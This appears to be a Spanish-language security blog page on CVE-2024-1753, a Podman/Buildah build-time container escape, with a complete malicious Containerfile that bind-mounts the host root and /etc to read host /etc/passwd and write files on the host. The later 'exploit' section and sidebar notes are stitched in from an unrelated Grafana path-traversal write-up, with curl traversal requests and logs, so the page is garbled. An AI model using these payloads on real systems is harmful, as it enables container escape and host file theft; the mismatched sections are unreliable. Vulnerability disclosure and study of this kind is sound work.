<!DOCTYPE html>
<html lang="es">
<head>
<title>CVE-2024-1753 | ØxBogart</title>

	<!-- meta -->
	<meta charset="utf-8" />
	<meta name="viewport" content="width=device-width,height=device-height,initial-scale=1.0,user-scalable=no,viewport-fit=cover" />
	<link rel="icon" type="/image/png" href="/blog/img/skull.png" />
	<link rel="canonical" href="https://0xbogarft.github.io/blog/hacking/CVE-2024-1753" />
	<meta name="author" content="0xBogart" />
	<meta name="description" content="CVE-2024-1753" />
	<meta name="keywords" content="CVE-2024-1753" />

	<!-- Twitter Tags -->
	<meta property="og:title" content="CVE-2024-1753" />
	<meta property="og:description" content="CVE-2024-1753" />
	<meta property="og:url" content="https://0xbogart.github.io/blog/hacking/CVE-2024-1753" />
	<meta property="og:image" content="https://0xbogart.github.io/blog/img/podman-cve-2024-1753.png" />
	<meta name="twitter:card" content="summary_large_image" />
	<meta name="twitter:site" content="@0xBogart" />
	<meta name="twitter:creator" content="@0xBogart" />
	<meta name="twitter:title" content="CVE-2024-1753 | ØxBogart" />
	<meta name="twitter:description" content="CVE-2024-1753 | ØxBogart" />
	<meta property="twitter:image" content="https://0xbogart.github.io/blog/img/podman-cve-2024-1753.png" />

	<!-- css -->
	<link rel="stylesheet" href="/css/bootstrap.min.css">
	<link rel="stylesheet" href="/css/ionicons.min.css">
	<link rel="stylesheet" href="/css/tabbared.css">
	<link rel="stylesheet" href="/css/sidebared.css">
	<link rel="stylesheet" href="/css/pace.css">
	<link rel="stylesheet" href="/css/custom.css">
	<link rel="stylesheet" href="/css/rhterm.css">
	<link rel="stylesheet" href="/css/blackarchvoid.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">

	<!-- js -->
	<script src="/js/jquery-2.1.3.min.js"></script>
	<script src="/js/bootstrap.min.js"></script>
	<script src="/js/pace.min.js"></script>
	<script src="/js/modernizr.custom.js"></script>
	<script src="/js/tabbar.js"></script>
	<script src="/js/asredlight.js"></script>
<style>
@media (max-width: 600px) {
  .imgmax {
    width: 104%; /* Ancho al 100% para pantallas de 600px o menos */
  }
}

.bg {
	border: 5px solid black;
	width: 100%;
}
</style>
</head>

<body class="bg">
	<div class="container">	
		<header id="site-header">
			<div class="row">
				<div style="margin-bottom: -10%;">
					<h1 style="margin-top: 7px;">H<a href="/blog/hacking"><img src="/blog/img/skullh.png" width="30px" height="40px" style="margin-top: -9px;"></a>CKING</h1>
				</div><!-- col-4 -->
			</div>
			<div class="row justify-content-end">
				<div class="col-2" style="margin-top: 5px;">
					<nav class="navbar navbar-expand-lg navbar-light">
						<button style="border: 1px solid #D80000;" class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#bs-example-navbar-collapse-1" aria-controls="bs-example-navbar-collapse-1" aria-expanded="false" aria-label="Toggle navigation">
							<span class="navbar-toggler-icon"></span>
						</button>
						<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
							<ul class="navbar-nav">
								<li class="nav-item">
									<a style="font-size: 25px;" class="nav-link" href="/index" data-hover="Home">Home</a>
								</li>
							</ul>
						</div><!--- .navbar-collapse --->
					</nav>
				</div><!-- col-md-8 -->
			</div>
		</header>
	</div>

	<!-- TABBAR -->
	<div style="position: sticky; top: -1px; width: auto;">
		<a onclick="toggleDropdown()">
			<div class="tabbar">
				<span style="font-weight: bold; float: left; margin-left: 10px;">TABLA DE CONTENIDO</span>
				<div class="dropdown-content" id="dropdownContent"></div>
			</div>
		</a>
		<div id="contenido">
			<h5>Podman [CVE-2024-1753] Escapar de Contenedores en Tiempo de Compilación</h5>
			<div style="border-top: 1px solid lightgray; width: 100%; margin: 10px 0;"></div>
			<a href="#VulnerabilityDetails" style="text-decoration: none;"><p style="margin-bottom: 6px; font-size: 16px;">☠ Detalles de Vulnerabilidad</p></a>
			<a href="#AUDIT" style="text-decoration: none;"><p style="margin-bottom: 6px; font-size: 16px;">☠ Auditando el Código Fuente</p></a>
			<a href="#EXPLOIT" style="text-decoration: none;"><p style="margin-bottom: 6px; font-size: 16px;">☠ Explotando la Vulnerabilidad [CVE-2024-1753]</p></a>
		</div>
	</div><!-- END TABBAR -->

	<div class="content-body">
		<div id="main" style="position: sticky; top: 0;">
			<button class="openbtn" onclick="toggleNav()">☠</button>
		</div><br>
		<div id="mySidebar" class="sidebar" style="display: none; position: sticky; top: 0; margin-top: -24px; padding-right: 1px;">
			<a href="javascript:void(0)" class="closebtn" onclick="toggleNav()">×</a>
			<span style="font-size: 25px; color: #ff0000;"><b>&nbsp;✎</b></span><span style="font-size: 25px; color: white;"> <b>Notas</b></span>
			<hr style="color: #ff0000;">
			<a><span style="color: #E5D400;">Podman</span><span class="spanx">: El recorrido de ruta o recorrido de directorio es una vulnerabilidad que permite a un atacante leer archivos arbitrarios en el servidor que ejecuta una aplicación</span></a>
			<a><span style="color: #E5D400;">POD</span><span class="spanx">: Indica a cURL que no maneje secuencias de <b>/../</b> o <b>/./</b> en la  URL dada.<br>Normalmente curl los aplastará o fusionará según los estándares, con esta opción no lo hará</span></a>
			<a><span style="color: #E5D400;">grafana.log</span><span class="spanx">: Archivo log que registra eventos relacionados con Grafana, ubicado en <b>/var/log/grafana/grafana.log</b> en Sistemas Linux\Unix</span></a>
		</div>
		<div class="container">
			<div class="row">
				<main class="col-md-8" style="margin-left: auto; margin-right: auto;">
					<article class="post post-1">
						<header  class="entry-header">
							<h1 class="blh1">Podman [Escapar de Contenedores en Tiempo de Compilación]</h1>
							<h2 class="blh2"><a style="color: #DB0000;">CVE</a>-<a style="color: #DB0000;">2024</a>-<a style="color: #DB0000;">1753</a></h2>
						</header>
						<div class="entry-content clearfix">
							<br><br>
							<section id="VulnerabilityDetails">
								<div class="centext">
									<a style="font-size: 19px; color: rgb(189, 0, 38);">☠ </a><span class="red-bg" style="font-size: 19px;">DETALLES DE VULNERABILIDAD</span>
								</div><br>
								<div class="leftl">
									<span style="margin-bottom: 10px;"><b><a style="color: #DB0000; margin-bottom: 10px;">•</a> Paquete:</b> Podman</span><br>
									<span style="margin-bottom: 10px;"><b><a style="color: #DB0000; margin-bottom: 10px;">•</a> Fecha de Publicación:</b> 5 de febrero de 2024</span><br>
									<span style="margin-bottom: 10px;"><b><a style="color: #DB0000; margin-bottom: 10px;">•</a> Fecha de Actualización:</b> 24 de marzo de 2024</span><br>
									<span style="margin-bottom: 10px;"><b><a style="color: #DB0000; margin-bottom: 10px;">•</a> Versiones Afectadas:</b> &lt; 4.9.4 y &lt; 5.0.1</span><br>
									<span style="margin-bottom: 10px;"><b><a style="color: #DB0000; margin-bottom: 10px;">•</a> Versiones Parcheadas:</b> 4.9.4 y 5.0.1</span><br>
									<span style="margin-bottom: 10px;"><b><a style="color: #DB0000; margin-bottom: 10px;">•</a> Gravedad:</b> <a style="color: #D80000;">Alta</a> 8.6/10</span><br>
									<span style="margin-bottom: 10px;"><b><a style="color: #DB0000; margin-bottom: 10px;">•</a> CVE ID:</b> CVE-2024-1753</span><br>
									<span style="margin-bottom: 10px;"><b><a style="color: #DB0000; margin-bottom: 10px;">•</a> Debilidades:</b> CWE-269</span><br>
									<span style="margin-bottom: 10px;"><b><a style="color: #DB0000; margin-bottom: 10px;">•</a> Impacto:</b> Los usuarios que ejecutan contenedores con privilegios de root permiten que un contenedor se ejecute con acceso de lectura\escritura sobre los archivos y directorios del sistema host anfitrión cuando SELinux está deshabilitado. Con SELinux habilitado, se dan casos de acceso de lectura.</span><br>
									<span style="margin-bottom: 10px;"><b><a style="color: #DB0000; margin-bottom: 10px;">•</a> Repositorio GitHub:</b> <a href="https://github.com/containers/podman" target="_blank">https://github.com/containers/podman</a></span><br>
									<span style="margin-bottom: 10px;"><b><a style="color: #DB0000; margin-bottom: 10px;">•</a> Parche para Buildah:</b> <a href="https://github.com/containers/buildah" target="_blank">https://github.com/containers/buildah</a></span><br>
								</div>
							</section>

							<div style="border-top: 1px solid lightgray; width: 100%; margin: 10px 0;"></div>
							
							<section style="margin-top: 130px;" id="RESUME">
								<div class="centext">
									<a style="font-size: 19px; color: rgb(189, 0, 38);">☠ </a><span class="red-bg" style="font-size: 19px;">RESUMEN</span>
								</div><br>
								<div class="leftl">
									<span>Se ha encontrado un fallo de seguridad en <b>Buildah</b> [y posteriormente en <b>Podman Build</b>] que permite a los contenedores montar ubicaciones arbitrarias en el sistema de archivos del host anfitrión en tiempo de compilación de contenedores. Al realizar montajes de enlace como parte de un paso de ejecución en tiempo de compilación, el argumento 'fuente' no se valida para garantizar que exista dentro de la raíz.</span><br><br>
									<span>Un Containerfile malicioso puede utilizar una imagen falsa con enlaces simbólicos al sistema de archivos raíz como fuente de montaje y hacer que la operación de montaje monte el sistema de archivos raíz del host dentro de la orden <b>RUN</b>. Los comandos dentro de la orden RUN tendrán acceso de lectura\escritura al sistema de archivos del host anfitrión, permitiendo escapar por completo del contenedor en tiempo de compilación.</span>
								</div>
							</section>

							<!-- POC -->
							<section style="margin-top: 130px;" id="POC">
								<div class="centext">
									<a style="font-size: 19px; color: rgb(189, 0, 38);">☠ </a><span class="red-bg" style="font-size: 19px;">VERSIONES Y COMPONENTES UTILIZADOS EN ESTA PoC</span>
								</div><br>
								
								<div class="leftl">
									<span>Versiones utilizadas en esta <b>PoC</b>:</span><br>
									<span><b><a style="margin-left: 35px; color: #DB0000;">⦿</a> Sistema Operativo</b>: CentOS 8 Stream</span><br>
									<span><b><a style="margin-left: 35px; color: #DB0000;">⦿</a> Versión vulnerable de Podman</b>: 4.9.4-dev</span><br>
									<span><b><a style="margin-left: 35px; color: #DB0000;">⦿</a> Estado de SELinux</b>: Permissive</span><br>
									<span><b><a style="margin-left: 35px; color: #DB0000;">⦿</a> Nombre del Containerfile malicioso</b>: cve_Containerfile</span>
									<span><b><a style="margin-left: 35px; color: #DB0000;">⦿</a> Crear un archivo de texto en la raíz de root [con usuario root]</b>: touch &#47;NO-DEBERIAS-PODER-VERME.txt</span>
								</div><br>
								
								<div class="centext">
									<span>Contenido del <b>Containerfile Malicioso</b>:</span>	
								</div>

								<!-- CONTENIDO DEL Containerfile MALICIOSO -->
								<div id="long-terminal">
									<!-- Terminal Body -->
									<section id="terminal__body">
										<div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 1px; color: #fff;"><b>FROM alpine as base</b></span>
										</div><br>
										  
										<div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 1px; color: #fff;"><b>RUN ln -s &#47; &#47;rootdir</b></span>
										</div>
										
										<div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 1px; color: #fff;"><b>RUN ln -s &#47;etc &#47;etc2</b></span>
										</div><p></p>
										  
										<div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 1px; color: #fff;"><b>FROM alpine</b></span>
										</div><br>
										  
										<div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 1px; color: #fff;"><b>RUN echo "ls container root"</b></span>
										</div>

										<div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 1px; color: #fff;"><b>RUN ls -l &#47;</b></span>
										</div><br>

										<div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 1px; color: #fff;"><b>RUN echo "La explotación de la vulnerabilidad muestra la raíz del host anfitrión, no la raíz del contenedor, y crea &#47;MONTAJE_BIND1 en la raíz &#47; del host anfitrión."</b></span>
										</div><p></p>

										<div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 1px; color: #fff;"><b>RUN --mount=type=bind,from=base,source=&#47;rootdir,destination=&#47;exploit,rw ls -l &#47;exploit; touch &#47;exploit&#47;MONTAJE_BIND1; ls -l &#47;exploit</b></span>
										</div><p></p>

										<div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 1px; color: #fff;"><b>RUN echo "Aquí se muestra el contenido del archivo &#47;etc&#47;passwd del host anfitrión, no el del contenedor, y crea &#47;MONTAJE_BIND2 en &#47;etc en el host anfitrión."</b></span>
										</div><p></p>

										<div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 1px; color: #fff;"><b>RUN --mount=type=bind,rw,source=&#47;etc2,destination=&#47;etc2,from=base ls -l &#47; ls -l &#47;etc2&#47;passwd; cat &#47;etc2&#47;passwd; touch &#47;etc2&#47;MONTAJE_BIND2; ls -l &#47;etc2</b></span>
										</div>
									</section>
								</div><br><br>
								<!-- END CONTENIDO DEL Containerfile MALICIOSO -->
								<div class="leftl">
									<span>El Containerfile se compone de 2 secciones definidas por instrucciones <b>FROM</b>, se construyen 2 imágenes. En la primera sección se crea una imagen base llamada <b>base</b> a partir de la imagen de Alpine.<br><br>Después se crean 2 enlaces simbólicos en la imagen base. Uno apunta al directorio raíz del sistema de archivos [&#47;] y se nombra como <b>rootdir</b>. El 2º enlace simbólico apunta al directorio &#47;etc del sistema de archivos y se nombra como &#47;etc2.</span>
									<br><br>
									<span>En la 2ª instrucción FROM se crea otra imagen a partir de Alpine:</span><br><p></p>
									<span><b><a style="color: #DB0000;">•</a> Lista el contenido del directorio raíz del contenedor</b></span><p></p>
									<span><b><a style="color: #DB0000;">•</a> Monta el volumen con <b>--mount</b> para acceder a directorios del sistema de archivos del host anfitrión, en vez de los del contenedor.</b></span><p></p>
									<span><b><a style="color: #DB0000;">•</a> Monta el directorio <b>rootdir</b> creado en la imagen base y se accede desde el contenedor. Se muestra su contenido y se crea un nuevo directorio llamado MONTAJE_BIND1 en la raíz del host anfitrión.</span><p></p>
									<span><b><a style="color: #DB0000;">•</a> Monta el directorio &#47;etc2 creado en la imagen base y se accede desde el contenedor. Se muestra el contenido del directorio raíz del host anfitrión y se imprime el contenido del archivo &#47;etc&#47;passwd del host anfitrión. Luego, crea un nuevo archivo llamado MONTAJE_BIND2 en el directorio &#47;etc del host anfitrión.</span>
								</div>
							</section>
							<!---- END POC ---->
							
							<div style="border-top: 1px solid lightgray; width: 100%; margin: 10px 0;"></div>
							<!-- END CLEAN GO -->
								
							<!--- EXPLOTANDO LA VUNLNERABILIDAD --->
							<section style="margin-top: 140px;" id="EXPLOIT">
								<div class="centext">
									<a style="font-size: 19px; color: rgb(189, 0, 38);">☠ </a><span class="red-bg" style="font-size: 19px;">EXPLOTANDO LA VULNERABILIDAD CVE-2024-1753</span>
									<p></p>
									<span>Ejecuta el contenedor con Privilegios de root: <a style="color: #D90000;"><b>sudo podman build -f cve_Containerfile .</b></a></span><br><br>
									<span><b>Pic 1: Ejecución del Contenedor con privilegios de root</b>:</span><p></p>
									<img src="/blog/hacking/img/pic1.png" class="imgmax" width="9085%">
								</div>
								
								<br><br>
								<div class="centext">
									<span><b>PLUGINS GRAFANA</b></span>
								</div>
								<p></p>
								
								<br>
								
								
								<div class="leftl" style="margin-top: 20px;">
									<span>El fichero <b>log</b> de Grafana registra un error tras la petición curl, que indica no encontrar la versión del plugin solicitado en la ruta <b>/usr/share/grafana/public/app/plugins/</b></span>
								</div>
								
								<div id="long-terminal">   
									  <!-- Terminal Body -->
									  <section id="terminal_body">
										<div id="terminal__prompt">
											<span id="terminal__prompt--bling">&nbsp;<b>lvl=error msg="Could not find plugin file" logger=context userId=0</b></span>
										  </div>
										  
										  <div id="terminal__prompt">
											<span id="terminal__prompt--bling">&nbsp;<b>uname= error="<a style="color: #ff0000;">open</a> /usr/share/grafana/public<a style="color: #ff0000;">/app/</a>plugins/ØxBogart: no such file or directory"</b></span><p></p>
										</div>
									  </section>
								</div>
								
								<div class="leftl" style="margin-top: 50px;">
									<span>Al hacer la misma petición pero esta vez con un recorrido de ruta de <b>5 niveles</b>, el error registrado en el log sitúa la búsqueda de la petición en <b>/usr/share/grafana</b></span>
								</div>
								<!--- SEGUNDO CURL --->
								<div id="long-terminal">
									  <!-- Terminal Bar -->       
									  <section id="terminal__bar">          
										<div id="bar__buttons">            
										  <button class="bar__button" id="bar__button--exit">&#10005;</button>            
										  <button class="bar__button">&#9472;</button>                
										  <button class="bar__button">&#9723;</button>          
										</div>
									  </section>        
									  <!-- Terminal Body -->
									  <section id="terminal__body">
										<div id="terminal__prompt">
											<span id="terminal__prompt--location"><a style="color: #ff0000; margin-left:1px;">☠</a>&nbsp;</span>
										<span id="terminal__prompt--bling" style="color: #000;"><b>curl --<a style="color: #BE0000;">path</a>-<a style="color: #BE0000;">as</a>-<a style="color: #BE0000;">is</a> http://localhost<a style="color: #BE0000;">:</a>3000<a style="color: #BE0000;">/</a>public/plugins/postgres<a style="color: #BE0000;">/../../../../../</a>ØxBogart</b></span>
										  </div><p></p>
									  </section>
									</div>
								<!--- END SEGUNDO CURL --->

								<!--- SEGUNDO LOG --->
								<div id="long-terminal">   
									  <!-- Terminal Body -->
									  <section id="terminal_body">
										<div id="terminal__prompt">
											<span id="terminal__prompt--bling">&nbsp;<b>lvl=error msg="Could not find plugin file" logger=context userId=0</b></span>
										  </div>

										  <div id="terminal__prompt">
											<span id="terminal__prompt--bling">&nbsp;<b>uname= error="<a style="color: #ff0000;">open</a> /usr/share/grafana/ØxBogart: no such file or directory"</b></span><p></p>
										</div>
									  </section>
								</div>
								<!--- END SEGUNDO LOG --->

								<div class="leftl" style="margin-top: 50px;">
									<span>Lo que lleva a la conclusión de que si se añaden 3 niveles más al recorrido de ruta, la petición se ubica en la partición raíz <b>/</b> permitiendo leer ficheros sensibles del sistema como <b>/etc/passwd</b></span>
								</div>
							</section>
							<!--- /etc/passwd --->
						</div>
					</article>
				</main>
			</div>
		</div>
	</div>
						
	<footer id="site-footer">
		<div class="container">
			<div class="row">
				<div class="col-md-12">
					<div class="copyright">
						<a class="nodeco" href="/index"><img src="/blog/img/0xbogart-shadow.png" style="width: 15%"></a>
					</div>
				</div>
			</div>
		</div>
	</footer>
	<a href="#" id="scrollToTopButtonRed"><i class="fas fa-arrow-up"></i></a>
<script>
function toggleNav() {
  var sidebar = document.getElementById("mySidebar");
  var sidebarDisplay = window.getComputedStyle(sidebar).display;

  if (sidebarDisplay === "none") {
    sidebar.style.display = "block"; // Mostrar el sidebar
    sidebar.style.width = "200px"; // Ancho deseado al mostrar el sidebar
  } else {
    sidebar.style.display = "none"; // Ocultar el sidebar al hacer clic nuevamente
  }
}
</script>
</body>
</html>
